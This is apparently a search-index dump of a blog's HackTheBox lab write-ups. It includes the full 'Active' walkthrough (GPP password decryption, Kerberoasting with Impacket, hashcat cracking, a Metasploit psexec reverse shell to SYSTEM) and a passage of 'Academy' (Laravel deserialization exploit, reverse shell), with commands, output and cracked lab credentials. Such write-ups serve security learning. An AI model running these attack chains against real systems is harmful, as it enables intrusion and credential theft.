root root 129 Jan 6 2007 .tcshrc-r-xr-xr-x 1 root root 16358730 Oct 31 2011 webmin-1.570-1.noarch.rpmsh-3.2# cat root.txtcat root.txte9cbc82da8917eed8f46488876238fa2sh-3.2# ls -al /homels -al /hometotal 28drwxr-xr-x 4 root root 4096 Apr 7 2017 .drwxr-xr-x 22 root root 4096 Jul 19 13:15 ..drwxrwxr-x 2 fanis fanis 4096 Apr 7 2017 fanisdrwx------ 2 spamfilter spamfilter 4096 Apr 7 2017 spamfiltersh-3.2# cd /home/fanis cd /home/fanissh-3.2# ls -alls -altotal 32drwxrwxr-x 2 fanis fanis 4096 Apr 7 2017 .drwxr-xr-x 4 root root 4096 Apr 7 2017 ..-rw------- 1 fanis fanis 114 Apr 7 2017 .bash_history-rw-r--r-- 1 fanis fanis 33 Apr 7 2017 .bash_logout-rw-r--r-- 1 fanis fanis 176 Apr 7 2017 .bash_profile-rw-r--r-- 1 fanis fanis 124 Apr 7 2017 .bashrc-rw-rw-r-- 1 fanis fanis 33 Jul 19 13:15 user.txtsh-3.2# cat user.txtcat user.txte11bbf4e23bcd880ec590402fa0c9a8esh-3.2#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Active", "url": "/posts/Active/", "categories": "HackTheBox", "tags": "GPP password, Kerberos, Metasploit, SMB, impacket module", "date": "2023-09-01 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.10.100Starting Nmap 7.94 ( https:/nmap.org ) at 2023-08-07 14:43 ISTNma...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.10.100Starting Nmap 7.94 ( https:/nmap.org ) at 2023-08-07 14:43 ISTNmap scan report for 10.10.10.100Host is up (0.17s latency).Not shown: 65512 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-07 09:21:08Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5722/tcp open msrpc Microsoft Windows RPC9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49165/tcp open msrpc Microsoft Windows RPC49170/tcp open msrpc Microsoft Windows RPC49171/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows```{: .nolineno}## SMB Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ smbclient -L /10.10.10.100/ Password for [WORKGROUP\\kali]:Anonymous login successful\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tNETLOGON Disk Logon server share \tReplication Disk \tSYSVOL Disk Logon server share \tUsers Disk Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available```{: .nolineno}Lets get the SMB shares file system â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ smbclient -N \\\\\\\\10.10.10.100\\\\ReplicationAnonymous login successfulTry \"help\" to get a list of possible commands.smb: \\> ls . D 0 Sat Jul 21 16:07:44 2018 .. D 0 Sat Jul 21 16:07:44 2018 active.htb D 0 Sat Jul 21 16:07:44 2018\t\t5217023 blocks of size 4096. 278613 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\> ls . D 0 Sat Jul 21 16:07:44 2018 .. D 0 Sat Jul 21 16:07:44 2018 Groups.xml A 533 Thu Jul 19 02:16:06 2018\t\t5217023 blocks of size 4096. 278613 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\> more Group.xml```{: .nolineno}Now I got credentials â†’```bashuserName = \"active.htb\\SVC_TGS\"cpassword = \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\"```{: .nolineno}In the above SMB share we have seen the content of the Replication folder in which in this instance contains the same information regarding Group Policy that SYSVOL will have , and since it contains the `Groups.xml` file which has `cpassword` value so lets decrypt this key through `gpp-decrypt` preinstalled tool in kali.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQGPPstillStandingStrong2k18```{: .nolineno}Now I got the decrypted password as : `GPPstillStandingStrong2k18````bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ smbclient \\\\\\\\10.10.10.100\\\\Users -U 'SVC_TGS' Password for [WORKGROUP\\SVC_TGS]:Try \"help\" to get a list of possible commands.smb: \\> ls -alNT_STATUS_NO_SUCH_FILE listing \\-alsmb: \\> ls . DR 0 Sat Jul 21 20:09:20 2018 .. DR 0 Sat Jul 21 20:09:20 2018 Administrator D 0 Mon Jul 16 15:44:21 2018 All Users DHSrn 0 Tue Jul 14 10:36:44 2009 Default DHR 0 Tue Jul 14 12:08:21 2009 Default User DHSrn 0 Tue Jul 14 10:36:44 2009 desktop.ini AHS 174 Tue Jul 14 10:27:55 2009 Public DR 0 Tue Jul 14 10:27:55 2009 SVC_TGS D 0 Sat Jul 21 20:46:32 2018\t\t5217023 blocks of size 4096. 278803 blocks availablesmb: \\> cd SVC_TGS\\smb: \\SVC_TGS\\> ls . D 0 Sat Jul 21 20:46:32 2018 .. D 0 Sat Jul 21 20:46:32 2018 Contacts D 0 Sat Jul 21 20:44:11 2018 Desktop D 0 Sat Jul 21 20:44:42 2018 Downloads D 0 Sat Jul 21 20:44:23 2018 Favorites D 0 Sat Jul 21 20:44:44 2018 Links D 0 Sat Jul 21 20:44:57 2018 My Documents D 0 Sat Jul 21 20:45:03 2018 My Music D 0 Sat Jul 21 20:45:32 2018 My Pictures D 0 Sat Jul 21 20:45:43 2018 My Videos D 0 Sat Jul 21 20:45:53 2018 Saved Games D 0 Sat Jul 21 20:46:12 2018 Searches D 0 Sat Jul 21 20:46:24 2018\t\t5217023 blocks of size 4096. 278803 blocks availablesmb: \\SVC_TGS\\> cd Desktopsmb: \\SVC_TGS\\Desktop\\> ls . D 0 Sat Jul 21 20:44:42 2018 .. D 0 Sat Jul 21 20:44:42 2018 user.txt AR 34 Wed Aug 9 09:44:14 2023\t\t5217023 blocks of size 4096. 278803 blocks availablesmb: \\SVC_TGS\\Desktop\\> get user.txtgetting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)```{: .nolineno}I got `users.txt` file â†’```bashc83e7e6adf44f7e0fef6f206da497b07```{: .nolineno}Now for Adminstrative Access I need to have enumerate Kerberos Tickets for that â†’We can use Impacket is `GetSPNusers.py` script to gather any Kerberos tickets.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ locate GetUserSPNs.py /usr/share/doc/python3-impacket/examples/GetUserSPNs.py â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -k -request -dc-ip 10.10.10.100 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[-] CCache file is not found. Skipping...ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation]-------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ----------active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-19 00:36:40.351723 2023-08-09 09:44:25.256547 [-] CCache file is not found. Skipping...$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ee302fdc44d924c812d4dbf4951e55ea$7fff363327a1bb30080575162ddde50d0667e954bcdeac1c4eb7cc6b60dfbbb1e90fd767a4d8782bbed2df4535e8291c898a43df3a0604520d099b2dcca534cf81c149443dad09fc8d91dbbec4dfcbfd5e40fc0ac390c426c0f829e93a99a832c554fc5f13e6e6c82fd09e6f59ebe4962c8fa0f961609f218bf65bdf71d647ee3aee63d4bc0d1d3992ff82a80ede35480167e5bdfa7b80c874d89f5bae0ff939d2e94d681bebb14691e9a269a617fa1990bf0e623d0434f27c2d80a7fcf823b71ce0eed731ead6d175a77cfc8cb05e711461ebd010b05890350ca1aed881804391126aa752fa70bddd40f81dc20804dcd243fc0f52eab97cb4656d3eff6b8a6b01dbbb8c59a0f752da3ff0fccd885ea56d02d11fa415902094e07cb305ee93767e49f840467075037f9349850189aede15509d941253d2f0d7382a062c64728eee30ed608e6861af93f9e93ebacda4846f414f55cbf29dd03eed14311024b31c0ebf78687cde98658f7cb46ddf66514e665aa3a42d48201122d3642ab9851d10c7dbe5a0fe54280068e8345585ae6dec4b7eb58e8a21ef6c1c8b271a9af0f130fd0afbe32e9e577115aa71b083a72bb231d37c10688817256cd958a790d80a994071065c00e4b3a3a706ea86c255ad3e29c2f05cf9b34ae42d8f866ca113f88e6847016dd3176d6869fb971d53be88f34fa31b77fc4ba9b929f542ba57435038955fcf06e40ad57437645f67ee1a84031b05e76316f637568de086b3422f1748fa8c4b63876694c4674b57d5b1be6a6e08a13d69d226aa1448a102da2fe7dc95bd4647b54ba400b4d6b85284c1349ae2cc8649b683e092ed0199beae9b86b2a478ee4e1ce1b2c655fb22d631a3720ba2e8f7cdfd11a27327d9fffb7015c1172de1371606d930384e231a8da9a5d6cef86689d0d642c185bed89292ada9eef434b2a9608550976ca3c4da449a7228f64127d00e7ed144a05485f7680b20e79d8f1cb21a6bace1b648fb54017d76d9b00f25181bc1bcef368497cd1459e86ee2bc988d4c82fd2183c6f0c999a4543370e3b838a60bbc694feceda08a812091cfa18d7224276adb520c79c5af3d49b393a358c567c5427596d22f8bbda433b776b9b355f4fb4b6aed914dfff32402adc81a98c8a2e5c01d42e8fa7ed7eb6bd845f69e916c63da059f4e5fc3d6839d29ef7c6a3f8fac310ea8773a852e86bff3503dc1e8bff5010b6981369a49000e401ae34336f487e076846a9abe```{: .nolineno}Now Lets crack this Ticket value and get the password what I wanted â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Active]â””â”€$ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]......* Create more work items to make use of your parallelization power: https:/hashcat.net/faq/morework$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$acb5a62add6835d58aa8fd01c863930c$c2e917f5e50ca6fbae799bcf10ebbe580415dbd539d68d80ce3448b26311a4b3c4dd28fa006edfb9de58c05382f42646fdc4bc1c9a19bbc3b963145b8fe67054f67538e33d2f2e531ac642e1867be1d3e292657382bcd2addac9d9f29e7ddc8c515ddba055a06c4a6102032dddd446a4a5d23b07fcbbf7510b4caf13b032bfcfe6dbafb75bcdc908e6deffb6f78dadb49d087b7f8914f37f1433dc272065eab015d81d6220a883ad25179e2c07d0be3bacf832df1884b3ed046b279549c6af5798ed6abeb08b94dffaa8127c81fd2417633edf853edc541b58e9a1792b904cae05f3af11c9b73ebb018741edd5d20c88553cb7ca614995cfed81048e05f90f5666d428aef7692c02b091a519d4cabc499ecd6b025c9f5740f0d240e5959b58bf0da5e02d10d5ba508c19f493fa69d5b59a76b535b9d8da0ded57a1393bda790f2877a4517ceca6212371d2bb25fe48eda582c39d0dedf706ccd15fbdd76ceca8a0068f9d0ae567d845538170e1135270949672f52b3ca2f63951bb077d8c95f787320fe00cd4c912feef706f57bd73ec12497dc4a97fb3997cef20eb841333b3567322247dd7c0b8d31b1aa1f1726274b56b994a416d74bd1555ead7567c0b5e2e9127072ed8f0ca3bbbfb7ff8aa20c7a5e42da855c9b4a64fba54994fe6ad1183b7588a60d6113ce65b1f5a9072732239091ef2be3183c89ea8458a5aa3775605f1994e723e4b19a2b753b8bba8031209757bf39b11d7cd054b62c20e59e39eb863a91b37dadf1b38f66360da2230bcbc0bc37b8c1e4530e023d95eb771f96135b000b7da40182dc2a54b733e52f678476a8436a3b8489dc45407a731fd909be001119ea22c5293c19815756e425256fc8c012db0df4034486925e9ed927473eaed76bcedd7f1c576cb51eeebc7488908e7b11aae3603b2aa25c245e2b59381d531fef7db22c6daf3bba078cc7dc6f6dcd62079e619e79d66ef9997f21be30b0f4ceeabb42ad18182a8fb115a6d07885b164194921ee46e09a5e91c8f7ab07747902b62afc2ef868469d754a581ab9cc33b09ba6c7d3d7ac433c63e31c325caba3a915577ae64a7006e1c6de1e6697d516a4ba6e0a5c253e245077842401be5ca1823dae75c931c0f1a9948cb2ce9da623ab25fad00f10cc684c1a32dfa53069c6bea1452136f373398470220337f3ac25356f9851219938e42ea96ab4d4f8fc5e522fbd3a28f3735c2193297b1864973a468d728a8ae15e000:Ticketmaster1968 Session..........: hashcatStatus...........: CrackedHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...15e000Time.Started.....: Wed Aug 9 13:31:15 2023 (18 secs)Time.Estimated...: Wed Aug 9 13:31:33 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 561.8 kH/s (1.46ms) @ Accel:512 Loops:1 Thr:1 Vec:4Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 10537984/14344385 (73.46%)Rejected.........: 0/10537984 (0.00%)Restore.Point....: 10536960/14344385 (73.46%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: Tiffany95 -> ThruJasonK21Hardware.Mon.#1..: Util: 77%Started: Wed Aug 9 13:30:50 2023Stopped: Wed Aug 9 13:31:34 2023```{: .nolineno}Now I got the password : `Ticketmaster1968` , lets get into the shell using these credentials through metasploit â†’Now lets use this module named as smb/psexec for the shell â†’```bashmsf6 exploit(windows/smb/psexec) > optionsModule options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.100 yes The target host(s), see https:/docs.metasploit.com/docs/using-metasploit /basics/using-metasploit.html RPORT 445 yes The SMB service port (TCP) SERVICE_DESCRIPTION no Service description to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SMBDomain active.htb no The Windows domain to use for authentication SMBPass Ticketmaster1968 no The password for the specified username SMBSHARE no The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma l read/write folder share SMBUser Administrator no The username to authenticate asPayload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.94 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 AutomaticView the full module info with the info, or info -d command.msf6 exploit(windows/smb/psexec) >```{: .nolineno}Now it time for exploit â¤µï¸ ```bashmsf6 exploit(windows/smb/psexec) > run[*] Started reverse TCP handler on 10.10.14.94:4444 [*] 10.10.10.100:445 - Connecting to the server...[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'Administrator'...[*] 10.10.10.100:445 - Selecting PowerShell target[*] 10.10.10.100:445 - Executing the payload...[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (175686 bytes) to 10.10.10.100[*] Meterpreter session 1 opened (10.10.14.94:4444 -> 10.10.10.100:49896) at 2023-08-09 13:36:47 +0530meterpreter > sysinfoComputer : DCOS : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).Architecture : x64System Language : el_GRDomain : ACTIVELogged On Users : 1Meterpreter : x86/windowsmeterpreter >meterpreter > pwdC:\\Windows\\system32meterpreter > cd ../../meterpreter > dirListing: C:\\=====Mode Size Type Last modified Name]---- ---- ---- ------------- ----040777/rwxrwxrwx 0 dir 2009-07-14 08:04:39 +0530 $Recycle.Bin040777/rwxrwxrwx 0 dir 2009-07-14 10:36:44 +0530 Documents and Settings040777/rwxrwxrwx 0 dir 2009-07-14 08:50:08 +0530 PerfLogs040555/r-xr-xr-x 4096 dir 2022-01-12 18:41:58 +0530 Program Files040555/r-xr-xr-x 4096 dir 2021-01-21 22:19:16 +0530 Program Files (x86)040777/rwxrwxrwx 4096 dir 2022-01-12 18:39:27 +0530 ProgramData040777/rwxrwxrwx 0 dir 2018-07-16 15:43:22 +0530 Recovery040777/rwxrwxrwx 4096 dir 2018-07-19 00:15:01 +0530 System Volume Information040555/r-xr-xr-x 4096 dir 2018-07-21 20:09:20 +0530 Users040777/rwxrwxrwx 16384 dir 2023-08-09 10:31:43 +0530 Windows000000/--------- 0 fif 1970-01-01 05:30:00 +0530 pagefile.sysmeterpreter > cd Usersmeterpreter > dirListing: C:\\Users==========Mode Size Type Last modified Name]---- ---- ---- ------------- ----040777/rwxrwxrwx 8192 dir 2018-07-16 15:44:21 +0530 Administrator040777/rwxrwxrwx 0 dir 2009-07-14 10:36:44 +0530 All Users040555/r-xr-xr-x 8192 dir 2009-07-14 12:08:21 +0530 Default040777/rwxrwxrwx 0 dir 2009-07-14 10:36:44 +0530 Default User040555/r-xr-xr-x 4096 dir 2009-07-14 10:27:55 +0530 Public040777/rwxrwxrwx 4096 dir 2018-07-21 20:46:32 +0530 SVC_TGS100666/rw-rw-rw- 174 fil 2009-07-14 10:27:55 +0530 desktop.inimeterpreter > cd Administrator\\\\meterpreter > lsListing: C:\\Users\\Administrator========================Mode Size Type Last modified Name]---- ---- ---- ------------- ----040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 AppData040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 Application Data040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Contacts040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 Cookies040555/r-xr-xr-x 0 dir 2021-01-21 22:19:47 +0530 Desktop040555/r-xr-xr-x 4096 dir 2018-07-30 19:20:10 +0530 Documents040555/r-xr-xr-x 0 dir 2021-01-21 22:22:32 +0530 Downloads040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Favorites040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Links040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 Local Settings040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Music040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 My Documents100666/rw-rw-rw- 524288 fil 2023-08-09 09:44:25 +0530 NTUSER.DAT100666/rw-rw-rw- 65536 fil 2018-07-16 15:44:15 +0530 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf100666/rw-rw-rw- 524288 fil 2018-07-16 15:44:15 +0530 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer0000000 0000000000001.regtrans-ms100666/rw-rw-rw- 524288 fil 2018-07-16 15:44:15 +0530 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer0000000 0000000000002.regtrans-ms040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 NetHood040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Pictures040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 PrintHood040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 Recent040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Saved Games040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Searches040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 SendTo040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 Start Menu040777/rwxrwxrwx 0 dir 2018-07-16 15:44:15 +0530 Templates040555/r-xr-xr-x 0 dir 2018-07-30 19:20:10 +0530 Videos100666/rw-rw-rw- 262144 fil 2023-08-09 10:31:43 +0530 ntuser.dat.LOG1100666/rw-rw-rw- 0 fil 2018-07-16 15:44:09 +0530 ntuser.dat.LOG2100666/rw-rw-rw- 20 fil 2018-07-16 15:44:15 +0530 ntuser.inimeterpreter > cd Desktopmeterpreter > lsListing: C:\\Users\\Administrator\\Desktop================================Mode Size Type Last modified Name]---- ---- ---- ------------- ----100666/rw-rw-rw- 282 fil 2018-07-30 19:20:10 +0530 desktop.ini100444/r--r--r-- 34 fil 2023-08-09 09:44:14 +0530 root.txtmeterpreter > cat root.txtc8a0d7e6349f05d8b41db241dfeb84ffmeterpreter >meterpreter > shellProcess 2848 created.Channel 2 created.Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Users\\Administrator\\Desktop>whoamiwhoamint authority\\system```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Academy", "url": "/posts/Academy/", "categories": "HackTheBox", "tags": "Metasploit, PrivEsc, Recon", "date": "2023-09-01 00:00:00 +0530", "snippet": "### Lets see the IP address â†’```bashIP : 10.10.10.215```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Academy]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.1...", "content": "### Lets see the IP address â†’```bashIP : 10.10.10.215```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Academy]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.10.215[sudo] password for kali: Starting Nmap 7.94 ( https:/nmap.org ) at 2023-07-21 15:32 ISTNmap scan report for 10.10.10.215Host is up (0.16s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)| 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)|_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http:/academy.htb/33060/tcp open mysqlx?| fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\"|_ HY0001 service unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸Site redirected to `http://academy.htb` so lets set the /etc/hosts file as academy.htb now â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled.png)Now lets try to change the value of roleid=0 to 1 , Lets see I can get any more access from that â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%201.png)But I got the same result as before â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%202.png)Now lets directory or files bruteforcing the site and find the missing places â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%203.png)Now lets access `admin.php` file â†’After some try I got the access to admin.php file â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%204.png)Now I have a subdomain as `dev-staging-01.academy.htb` so lets set the `/etc/hosts` value as it is â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%205.png)I looked at Laravel Service on this page â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%206.png)Now from metasploit I got a hit in Laravel , so lets try it out now â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%207.png)Now lets run this and see what I get next â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%208.png)Now I got the reverse shell in 4 sessions so lets use the 1 session â†’```bashmsf6 exploit(unix/http/laravel_token_unserialize_exec) > sessions 1[*] Starting interaction with 1...python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoamiwhoamiwww-datawww-data@academy:/var/www/html/htb-academy-dev-01/public$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@academy:/var/www/html/htb-academy-dev-01/public$```{: .nolineno}Now I got the reverse shell so lets dig into this â†’```bashwww-data@academy:/home/cry0l1t3$ ls -alls -altotal 32drwxr-xr-x 4 cry0l1t3 cry0l1t3 4096 Aug 12 2020 .drwxr-xr-x 8 root root 4096 Aug 10 2020 ..lrwxrwxrwx 1 root root 9 Aug 10 2020 .bash_history -> /dev/null-rw-r--r-- 1 cry0l1t3 cry0l1t3 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 cry0l1t3 cry0l1t3 3771 Feb 25 2020 .bashrcdrwx------ 2 cry0l1t3 cry0l1t3 4096 Aug 12 2020 .cachedrwxrwxr-x 3 cry0l1t3 cry0l1t3 4096 Aug 12 2020 .local-rw-r--r-- 1 cry0l1t3 cry0l1t3 807 Feb 25 2020 .profile-r--r----- 1 cry0l1t3 cry0l1t3 33 Jul 21 04:15 user.txtwww-data@academy:/home/cry0l1t3$```{: .nolineno}For opening this user.txt file I need to be `cry0l1t3` user â†’```bashwww-data@academy:/var/www/html/htb-academy-dev-01$ ls -altotal 284drwxr-xr-x 12 root root 4096 Aug 13 2020 .drwxr-xr-x 4 root root 4096 Aug 13 2020 ..-rw-r--r-- 1 root root 702 Aug 13 2020 .env-rw-r--r-- 1 root root 651 Feb 7 2018 .env.example-rw-r--r-- 1 root root 111 Feb 7 2018 .gitattributes-rw-r--r-- 1 root root 155 Feb 7 2018 .gitignoredrwxr-xr-x 6 root root 4096 Feb 7 2018 app-rwxr-xr-x 1 root root 1686 Feb 7 2018 artisandrwxr-xr-x 3 root root 4096 Feb 7 2018 bootstrap-rw-r--r-- 1 root root 1513 Aug 13 2020 composer.json-rw-r--r-- 1 root root 193502 Aug 13 2020 composer.lockdrwxr-xr-x 2 root root 4096 Feb 7 2018 configdrwxr-xr-x 5 root root 4096 Feb 7 2018 database-rw-r--r-- 1 root root 1150 Feb 7 2018 package.json-rw-r--r-- 1 root root 1040 Feb 7 2018 phpunit.xmldrwxr-xr-x 4 root root 4096 Aug 13 2020 public-rw-r--r-- 1 root root 3622 Feb 7 2018 readme.mddrwxr-xr-x 5 root root 4096 Feb 7 2018 resourcesdrwxr-xr-x 2 root root 4096 Aug 13 2020 routes-rw-r--r-- 1 root root 563 Feb 7 2018 server.phpdrwxr-xr-x 5 root root 4096 Feb 7 2018 storagedrwxr-xr-x 4 root root 4096 Feb 7 2018 testsdrwxr-xr-x 38 root root 4096 Aug 13 2020 vendor-rw-r--r-- 1 root root 549 Feb 7 2018 webpack.mix.jswww-data@academy:/var/www/html/htb-academy-dev-01$```{: .nolineno}Now in `.env` file I got something inside /academy directory â†’```bashwww-data@academy:/var/www/html/academy$ cat 